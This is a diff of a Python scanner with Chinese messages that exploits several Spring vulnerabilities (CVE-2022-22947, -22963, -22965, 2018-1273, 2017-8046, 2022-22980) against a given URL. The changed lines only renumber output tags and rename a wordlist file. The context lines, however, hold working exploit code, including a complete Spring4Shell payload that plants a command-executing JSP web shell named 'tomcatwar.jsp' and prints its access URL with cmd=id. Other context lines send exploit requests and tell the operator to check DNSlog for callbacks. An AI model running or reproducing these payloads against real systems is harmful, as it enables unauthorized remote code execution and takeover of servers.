@@ -38,12 +38,12 @@ if r.status_code==201:##创建
     if r.status_code==200:##刷新
         r=requests.get(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
         if r.status_code==200:##判断并输出结果
-            print(colorama.Fore.CYAN+"[+]"+url+"存在CVE-2022-22947漏洞，输出结果")
+            print(colorama.Fore.CYAN+"[+1+]"+url+"存在CVE-2022-22947漏洞，输出结果")
             print("########################################################")
             a=r.json()
             print(colorama.Fore.CYAN+a['filters'][0].split("'")[1])
 else:
-    print("[-]"+url+"目标不存在CVE-2022-22947漏洞")
+    print("[-1-]"+url+"目标不存在CVE-2022-22947漏洞")
     print("########################################################")
 print('')
 print("########################################################")
@@ -63,10 +63,10 @@ path = 'functionRouter'
 data = 'test'
 r1 = requests.post(url=url+path, headers=headers2, data=data,)
 if r1.status_code == 500:
-    print(colorama.Fore.CYAN+"[+]" + url + "可能存在cve-2022-22963，返回终端看有无Dnslog请求")
+    print(colorama.Fore.CYAN+"[+2+]" + url + "可能存在cve-2022-22963，返回终端看有无Dnslog请求")
     print("########################################################")
 else:
-    print("[-]"+url+"目标不存在CVE-2022-22963漏洞")
+    print("[-2-]"+url+"目标不存在CVE-2022-22963漏洞")
     print("########################################################")
 
 
@@ -85,10 +85,10 @@ headers3 = {
 url1=url+'?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='##payload
 r=requests.get(url=url1,headers=headers3)
 if r.status_code==200:
-    print(colorama.Fore.CYAN+"[+]"+url+"目标可能存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
+    print(colorama.Fore.CYAN+"[+3+]"+url+"目标可能存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
     print("########################################################")
 else:
-    print("[-]"+url+"目标不存在CVE-2022-22965漏洞")
+    print("[-3-]"+url+"目标不存在CVE-2022-22965漏洞")
     print("########################################################")
 
 
@@ -103,10 +103,10 @@ cve_2018_1273headers={
 }
 cve_2018_1273request=requests.post(url=url+cve_2018_1273path,headers=cve_2018_1273headers,data=cve_2018_1273payload)
 if cve_2018_1273request.status_code==500:
-    print(colorama.Fore.CYAN+"[+]" + url + '可能存在CVE-2018-1273，返回终端看有无Dnslog请求')
+    print(colorama.Fore.CYAN+"[+4+]" + url + '可能存在CVE-2018-1273，返回终端看有无Dnslog请求')
     print("########################################################")
 else:
-    print('#'"[-]"+url+'目标不存在CVE-2018-1273漏洞')
+    print('#'"[-4-]"+url+'目标不存在CVE-2018-1273漏洞')
     print("########################################################")
 
 
@@ -134,10 +134,10 @@ cve_2017_8046_h={
 cve_2017_8046_path='customers/1'##漏洞路径
 cve_2017_8046_r=requests.patch(url=url+cve_2017_8046_path,headers=cve_2017_8046_h,data=cve_2017_8046_d)
 if cve_2017_8046_r.status_code==400:
-    print(colorama.Fore.CYAN+"[+]" + url + '可能存在CVE-2017-8046，返回终端看有无Dnslog请求')
+    print(colorama.Fore.CYAN+"[+5+]" + url + '可能存在CVE-2017-8046，返回终端看有无Dnslog请求')
     print("########################################################")
 else:
-    print('#'"[-]" + url + '目标不存在CVE-2017-8046漏洞')
+    print('#'"[-5-]" + url + '目标不存在CVE-2017-8046漏洞')
     print("########################################################")
 
 ##cve_2022_22980
@@ -152,10 +152,10 @@ cve_2022_22980_headers={
 cve_2022_22980_r=requests.post(url=url+cve_2022_22980_path,headers=cve_2022_22980_headers,data=cve_2022_22980_data)
 
 if cve_2022_22980_r.status_code==500:
-    print(colorama.Fore.CYAN + "[+]" + url + '可能存在CVE-2022-22980，返回终端看有无Dnslog请求')
+    print(colorama.Fore.CYAN + "[+6+]" + url + '可能存在CVE-2022-22980，返回终端看有无Dnslog请求')
     print("########################################################")
 else:
-    print('#'"[-]" + url + '目标不存在CVE-2022-22980漏洞')
+    print('#'"[-6-]" + url + '目标不存在CVE-2022-22980漏洞')
     print("########################################################")
 
 
@@ -163,7 +163,7 @@ else:
 
 print('')
 print("Spring敏感接口扫描开始")
-def get_path(url,file = "mulu.txt"):
+def get_path(url,file = "目录字典.txt"):
     path_queue = queue.Queue()
     f = open(file, "r", encoding="gbk")
     for i in f.readlines():
